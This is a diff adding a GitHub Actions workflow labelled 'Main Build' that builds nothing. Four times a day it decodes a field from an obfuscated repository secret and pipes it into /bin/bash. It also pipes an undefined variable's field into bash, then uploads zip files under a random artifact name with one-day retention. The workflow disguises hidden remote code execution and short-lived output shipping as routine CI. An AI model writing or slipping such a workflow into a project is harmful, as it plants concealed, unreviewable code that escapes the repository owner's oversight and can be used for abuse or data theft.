@@ -1,0 +1,32 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          g969: ${{ secrets.g969 }}
+        run: |
+          printf '%s' "$g969" | jq -r .lhlu6 | /bin/bash
+          echo $pdjhl2784 | jq -r .t8 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: nBtKJN3U
+          path: "*.zip"
+          retention-days: 1
